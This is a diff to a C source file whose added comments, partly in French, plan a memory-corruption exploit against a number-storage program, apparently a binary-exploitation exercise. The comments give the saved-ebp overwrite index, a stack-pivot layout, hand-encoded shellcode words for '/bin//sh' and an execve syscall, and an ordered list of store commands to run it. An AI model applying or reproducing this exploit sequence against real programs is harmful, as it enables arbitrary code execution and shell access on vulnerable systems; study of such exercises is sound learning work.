@@ -44,14 +44,20 @@ int read_number(unsigned int *addr) {
 	return (0);
 }
 
-//peut etre mettre le shellcode dans les arg ou dans le storage
+//On va faire un syscall sur execve dans notre storage
 //
 //
 //
 //le -11 segfault: on touche a ebp sauvegarder. il suffit de modifier l'ebp pour
 //avoir une stack personnalisee
-//read -9: adresse de la ou on ecris.
+//read  -9: adresse de la ou on ecris.
+//read 153: adresse argument
 //
+//
+//0x80cd0bb0 == 2160921520  --> syscall to execve
+//0xe1f7c931 == 3791112497  --> ecx et eax == 0
+//0x6e69622f == 1852400175  == nib/
+//0x0068732f ==    6845231  ==  hs/
 //
 //
 //
@@ -61,14 +67,28 @@ int read_number(unsigned int *addr) {
 //                                                                         |
 //                                                                         |
 //0                                                                        |
-//+1   -> new esp   ==       *(read -9) + 1*4             && pop ebx       |
+//+1   -> new esp   ==       *(read -9) + 1*4   && pop ebx == (addr stak sh| -> *(read -9) + 7*4)
 //+2   -> pop esi               ^                                          |
 // 3   -> pop edi               | lea    -0xc(%ebp),%esp   <----------------
 //+4   -> new ebp   ==       *(read -9) + 4*4             && pop ebp
-//+5   -> pop eip   => store *(shellcode)
+//+5   -> pop eip   => store *(addr shellcode syscall)
 // 6
-//+7
-//+8
+//+7   -> store(nib/ == 1852400175)
+//+8   -> store( hs/ ==    6845231)
 // 9
-//+10
-//+11
+//+10  -> store(ecx/eax = 0 -> 3791112497)
+//+11  -> store(syscall -> 2160921520)
+//
+//
+//
+//
+//so in order:
+//var addr = *(read -9)
+//store (addr + 4*4) -11
+//store (addr + 7*4) 1
+//store (addr + 10*4) 5
+//store (1852400175) 7
+//store (6845231) 8
+//store (3791112497) 10
+//store (2160921520) 11
+//quit
